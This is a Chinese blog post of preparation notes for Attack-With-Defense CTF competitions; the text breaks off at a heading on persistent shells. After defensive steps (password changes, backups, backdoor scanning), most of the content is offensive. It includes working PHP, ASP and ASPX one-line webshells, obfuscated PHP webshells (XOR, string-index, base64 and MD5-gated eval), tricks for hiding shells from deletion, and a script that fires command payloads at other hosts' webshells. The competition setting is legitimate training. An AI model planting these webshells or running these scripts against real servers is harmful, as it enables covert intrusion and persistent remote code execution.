<!-- build time:Sun Feb 19 2023 16:35:52 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="putao" href="http://example.com/rss.xml"><link rel="alternate" type="application/atom+xml" title="putao" href="http://example.com/atom.xml"><link rel="alternate" type="application/json" title="putao" href="http://example.com/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><link rel="canonical" href="http://example.com/2022/11/17/study/AWD%E5%87%86%E5%A4%87/"><title>AWD准备 - 学习 | Putao0v0 = putao</title><meta name="generator" content="Hexo 6.2.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">AWD准备</h1><div class="meta"><span class="item" title="创建时间：2022-11-17 00:00:00"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2022-11-17T00:00:00+08:00">2022-11-17</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>27k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>25 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">Putao0v0</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://pic.imgdb.cn/item/63f1df1af144a01007b2ae47.jpg"></li><li class="item" data-background-image="https://pic.imgdb.cn/item/63f1df1af144a01007b2ae06.jpg"></li><li class="item" data-background-image="https://pic.imgdb.cn/item/63f1dd6df144a01007af3513.jpg"></li><li class="item" data-background-image="https://pic.imgdb.cn/item/63f1df38f144a01007b3161b.jpg"></li><li class="item" data-background-image="https://pic.imgdb.cn/item/63f1dd6cf144a01007af346b.jpg"></li><li class="item" data-background-image="https://pic.imgdb.cn/item/63f1dd6df144a01007af3540.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/study/" itemprop="item" rel="index" title="分类于 学习"><span itemprop="name">学习</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://example.com/2022/11/17/study/AWD%E5%87%86%E5%A4%87/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/1.jpg"><meta itemprop="name" content="Putao0v0"><meta itemprop="description" content=", "></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="putao"></span><div class="body md" itemprop="articleBody"><h2 id="改密码"><a class="anchor" href="#改密码">#</a> 改密码</h2><p>官方在给出服务器密码时，很有可能是默认的，那就需要赶快修改自己的密码，但一般主办方给的是随机密码。</p><p>如果发现每个队伍的 SSH 账号密码都是一样的，需要立即修改口令，如果被其他队伍改了那就 gg 了，同时要准备好批量脚本，一旦是默认密码，可以直接利用。</p><p>SSH 密码修改:</p><pre><code>passwd
</code></pre><p>mysql 密码修改:</p><pre><code>#方法一
show databases;
use mysql
set password for root@localhost = password('123');
#方法二
update user set password = PASSWORD('需要更换的密码') where user='root';
flush privileges;
show tables;
</code></pre><p>Web 后台很有可能存在弱口令，需要立即修改，也可以修改其他队伍的后台口令，为本队所用，说不定可以利用后台 getshell。</p><h2 id="备份源码"><a class="anchor" href="#备份源码">#</a> 备份源码</h2><p>比赛开始后第一时间备份服务器中 web 目录下的文件 (/var/www/html)，备份的目的在于万一对方利用漏洞进入你的靶机将你的 WWW 下的目录给删除了，可以及时恢复，如果你没有备份就相当于宕机了</p><p>比赛开始第一时间备份，备份网站目录及数据库，一般在 /var/www/html 目录。</p><p>1. 目录打包</p><pre><code>打包
tar -zcvf archive_name.tar.gz  directory_to_compress
注意：如果使用tar命令打包文件夹，.index.php（隐藏类型文件）将不会被打包

备份整站
cd /var/www &amp;&amp; tar -czvf /tmp/html.tgz html
# 软连接到了/app
cd / &amp;&amp; tar -czvf /tmp/app.tgz app

解包
tar -zxvf archive_name.tar.gz
</code></pre><p>2. 备份数据库</p><ul><li>备份指定的多个数据库</li></ul><pre><code>mysqldump -uroot -proot --databases DB1 DB2 &gt; /tmp/db.sql
</code></pre><p>无 lock tables 权限的解决方法</p><pre><code>mysqldump -uroot -proot --all-databases --skip-lock-tables &gt; /tmp/db.sql
</code></pre><ul><li>恢复备份（在 MySQL 终端下执行）</li></ul><pre><code>source FILE_PATH
</code></pre><ul><li>重置 MySQL 密码（在 MySQL 终端下执行）</li></ul><p>方法 1</p><pre><code>set password for 用户名@localhost = password(&quot;新密码&quot;)
</code></pre><p>方法 2</p><pre><code>mysqladmin -u用户名 -p旧密码 password 新密码
</code></pre><p>3. 下载到本地</p><pre><code>scp -P ssh_port user@host_ip:/tmp/bak.sql local_file
</code></pre><h2 id="查找预留后门"><a class="anchor" href="#查找预留后门">#</a> 查找预留后门</h2><p>用 D 盾扫描备份的文件，查找预留后门，第一时间删除自己靶机上的后门，也可以利用后门攻击其他靶机。</p><p>可以使用 seay 进行代码审计</p><h2 id="端口扫描"><a class="anchor" href="#端口扫描">#</a> 端口扫描</h2><p>端口扫描是信息收集的一部分，需要知道目标服务器开放了哪些端口，使用端口扫描工具有御剑高速 TCP 全端口扫描工具、nmap 和 masscan 等进行扫描。<br>所有服务器配置都是一样的，也可以看己方靶机开放了哪些端口。</p><p>以下是一些服务端口的漏洞：<br>22：ssh 弱口令<br>873：未授权访问漏洞<br>3306：mysql 弱口令<br>6379：redis 未授权访问漏洞</p><h1 id="攻击思路"><a class="anchor" href="#攻击思路">#</a> 攻击思路</h1><h2 id="主机发现"><a class="anchor" href="#主机发现">#</a> 主机发现</h2><p>信息收集</p><ul><li>nmap、Routescan</li><li>Python 脚本</li></ul><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">:</span> </pre></td></tr><tr><td data-num="3"></td><td><pre>    url <span class="token operator">=</span> <span class="token string">"http://192.168.1.&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">try</span><span class="token punctuation">:</span> </pre></td></tr><tr><td data-num="5"></td><td><pre>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">except</span><span class="token punctuation">:</span> </pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token keyword">pass</span></pre></td></tr></table></figure><h2 id="后门利用"><a class="anchor" href="#后门利用">#</a> 后门利用</h2><p>curl 读 flag</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>admin<span class="token operator">></span>curl <span class="token string">"http://192.168.182.130:8801/include/shell.php"</span> -d <span class="token string">"admin_ccmd=system('cat /f*');"</span></pre></td></tr><tr><td data-num="2"></td><td><pre>SL<span class="token punctuation">&#123;</span>4a0be463dd85555090f2216795677916d2447242<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>flag<span class="token punctuation">&#123;</span>glzjin_wants_a_girl_friend<span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>脚本</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>端口</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#coding=utf-8</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="4"></td><td><pre>url_head<span class="token operator">=</span><span class="token string">"http://192.168.182.130"</span>   <span class="token comment">#网段</span></pre></td></tr><tr><td data-num="5"></td><td><pre>url<span class="token operator">=</span><span class="token string">""</span></pre></td></tr><tr><td data-num="6"></td><td><pre>shell_addr<span class="token operator">=</span><span class="token string">"/upload/url/shell.php"</span> <span class="token comment">#木马路径</span></pre></td></tr><tr><td data-num="7"></td><td><pre>passwd<span class="token operator">=</span><span class="token string">"pass"</span>                   <span class="token comment">#木马密码</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment">#port="80"</span></pre></td></tr><tr><td data-num="9"></td><td><pre>payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span>passwd<span class="token punctuation">:</span> <span class="token string">'System(\'cat /flag\');'</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment"># find / -name "flag*"</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token comment">#清空上次记录</span></pre></td></tr><tr><td data-num="13"></td><td><pre>flag<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>flag<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre>flag<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">,</span><span class="token number">8004</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    url<span class="token operator">=</span>url_head<span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span>shell_addr</pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        res<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment">#,timeout=1</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> requests<span class="token punctuation">.</span>codes<span class="token punctuation">.</span>ok<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre>            result <span class="token operator">=</span> res<span class="token punctuation">.</span>text</pre></td></tr><tr><td data-num="25"></td><td><pre>            <span class="token keyword">print</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>            flag<span class="token punctuation">.</span>write<span class="token punctuation">(</span>result<span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="28"></td><td><pre>            <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"shell 404"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token keyword">except</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        <span class="token keyword">print</span> <span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">" connect shell fail"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre></pre></td></tr><tr><td data-num="32"></td><td><pre>flag<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h2 id="一句话木马"><a class="anchor" href="#一句话木马">#</a> 一句话木马</h2><p>常用语言的一句话木马</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>php： <span class="token operator">&lt;</span>?php @eval<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span>      <span class="token operator">&lt;</span>?php eval<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>asp：   <span class="token operator">&lt;</span>%eval request <span class="token punctuation">(</span><span class="token string">"pass"</span><span class="token punctuation">)</span>%<span class="token operator">></span></pre></td></tr><tr><td data-num="3"></td><td><pre>aspx：  <span class="token operator">&lt;</span>%@ Page <span class="token assign-left variable">Language</span><span class="token operator">=</span><span class="token string">"Jscript"</span>%<span class="token operator">></span> <span class="token operator">&lt;</span>%eval<span class="token punctuation">(</span>Request.Item<span class="token punctuation">[</span><span class="token string">"pass"</span><span class="token punctuation">]</span>,<span class="token string">"unsafe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>%<span class="token operator">></span></pre></td></tr></table></figure><p>蚁剑连接 get 型木马，之前一直不会用蚁剑连接 get 型木马，这里记录一下。</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span>?php eval<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>/shell.php?pass<span class="token operator">=</span>eval<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>连接密码：1</pre></td></tr></table></figure><h2 id="隐藏shell"><a class="anchor" href="#隐藏shell">#</a> 隐藏 shell</h2><p>shell 很容易被发现，被删除就 gg 了，可以采用一些操作隐藏 shell 或使 shell 无法被删除</p><p><strong>1. 把 shell.php 命名为.shell.php</strong></p><p>.shell.php 在执行 ls 时无法被查看到，搭配 ls 的参数才能被发现<br>完整命令如下</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">[</span>sss@ecs-centos-7 awd<span class="token punctuation">]</span>$ <span class="token builtin class-name">echo</span> <span class="token string">"iamshell"</span><span class="token operator">></span>shell.php</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">[</span>sss@ecs-centos-7 awd<span class="token punctuation">]</span>$ <span class="token function">ls</span></pre></td></tr><tr><td data-num="3"></td><td><pre>shell.php</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">[</span>sss@ecs-centos-7 awd<span class="token punctuation">]</span>$ <span class="token function">mv</span> shell.php .shell.php</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">[</span>sss@ecs-centos-7 awd<span class="token punctuation">]</span>$ <span class="token function">ls</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">[</span>sss@ecs-centos-7 awd<span class="token punctuation">]</span>$ <span class="token function">ls</span> -al</pre></td></tr><tr><td data-num="7"></td><td><pre>总用量 <span class="token number">12</span></pre></td></tr><tr><td data-num="8"></td><td><pre>drwxrwxr-x <span class="token number">2</span> sss sss <span class="token number">4096</span> <span class="token number">12</span>月  <span class="token number">29</span> <span class="token number">22</span>:52 <span class="token builtin class-name">.</span></pre></td></tr><tr><td data-num="9"></td><td><pre>drwx------ <span class="token number">4</span> sss sss <span class="token number">4096</span> <span class="token number">12</span>月  <span class="token number">29</span> <span class="token number">22</span>:51 <span class="token punctuation">..</span></pre></td></tr><tr><td data-num="10"></td><td><pre>-rw-rw-r-- <span class="token number">1</span> sss sss    <span class="token number">9</span> <span class="token number">12</span>月  <span class="token number">29</span> <span class="token number">22</span>:52 .shell.php</pre></td></tr></table></figure><p><strong>2. 把 shell.php 命名为 - shell.php</strong><br>从上面可以看出，ls 加参数才能查看到 shell，那么我们直接写一个 - shell.php、<br>命令行会把 - 后面的内容当成参数执行，执行即使被发现，使用 rm 命令进行删除，会被当成是 rm 的参数，就会发生报错，无法删除 shell，目的也达到了</p><p>完整命令如下</p><figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">[</span>sss@ecs-centos-7 awd<span class="token punctuation">]</span>$ <span class="token function">ls</span></pre></td></tr><tr><td data-num="2"></td><td><pre>-shell.php</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">[</span>sss@ecs-centos-7 awd<span class="token punctuation">]</span>$ <span class="token function">rm</span> -shell.php </pre></td></tr><tr><td data-num="4"></td><td><pre>rm：无效选项 -- s</pre></td></tr><tr><td data-num="5"></td><td><pre>Try <span class="token string">'rm ./-shell.php'</span> to remove the <span class="token function">file</span> <span class="token string">"-shell.php"</span><span class="token builtin class-name">.</span></pre></td></tr><tr><td data-num="6"></td><td><pre>Try <span class="token string">'rm --help'</span> <span class="token keyword">for</span> <span class="token function">more</span> information.</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">[</span>sss@ecs-centos-7 awd<span class="token punctuation">]</span>$ <span class="token function">rm</span> -rf -shell.php </pre></td></tr><tr><td data-num="8"></td><td><pre>rm：无效选项 -- s</pre></td></tr><tr><td data-num="9"></td><td><pre>Try <span class="token string">'rm ./-shell.php'</span> to remove the <span class="token function">file</span> <span class="token string">"-shell.php"</span><span class="token builtin class-name">.</span></pre></td></tr><tr><td data-num="10"></td><td><pre>Try <span class="token string">'rm --help'</span> <span class="token keyword">for</span> <span class="token function">more</span> information.</pre></td></tr></table></figure><h2 id="特殊的shell"><a class="anchor" href="#特殊的shell">#</a> 特殊的 shell</h2><p>shell1：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token punctuation">(</span><span class="token variable">$_</span><span class="token operator">=</span>@<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span>@<span class="token variable">$_</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></pre></td></tr></table></figure><p>连接方式：php?2=assert 密码是 1。</p><p>shell2：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">chr</span><span class="token punctuation">(</span> <span class="token number">96</span><span class="token operator">^</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$b</span><span class="token operator">=</span><span class="token function">chr</span><span class="token punctuation">(</span> <span class="token number">57</span><span class="token operator">^</span><span class="token number">79</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token variable">$c</span><span class="token operator">=</span><span class="token function">chr</span><span class="token punctuation">(</span> <span class="token number">15</span><span class="token operator">^</span><span class="token number">110</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token variable">$d</span><span class="token operator">=</span><span class="token function">chr</span><span class="token punctuation">(</span> <span class="token number">58</span><span class="token operator">^</span><span class="token number">86</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token variable">$e</span><span class="token operator">=</span> <span class="token string single-quoted-string">'($_REQUEST[C])'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>@<span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token operator">.</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token variable">$d</span><span class="token operator">.</span><span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><p>配置为？b=)) 99 (rhC (tseuqeR+lave</p><p>shell3：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token variable">$sF</span><span class="token operator">=</span> <span class="token string double-quoted-string">"PCT4BA6ODSE_"</span><span class="token punctuation">;</span><span class="token variable">$s21</span><span class="token operator">=</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$sF</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$sF</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$sF</span><span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$sF</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$sF</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$sF</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$sF</span><span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$sF</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$sF</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$sF</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$sF</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$sF</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$sF</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s22</span><span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token function">strtoupper</span><span class="token punctuation">(</span><span class="token variable">$sF</span><span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$sF</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$sF</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$sF</span><span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$sF</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n985de9'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$s22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$s21</span><span class="token punctuation">(</span><span class="token variable">$s22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><p>配置填 n985de9=QGV2YWwoJF9QT1NUWzBdKTs=<br>连接密码：0（零）</p><p>shell4：MD5 木马</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">'d8d1a1efe0134e2530f503028a825253'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><p>shell5：MD5 木马 + 利用 header<br>2021ISCC 河南赛区线下赛就是这种 shell，当时差点没看出来</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">echo</span> <span class="token string single-quoted-string">'hello'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">'d8d1a1efe0134e2530f503028a825253'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token variable">$test</span><span class="token operator">=</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag:<span class="token interpolation"><span class="token variable">$test</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><h2 id="不死马"><a class="anchor" href="#不死马">#</a> 不死马</h2><p>不死马示例：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td 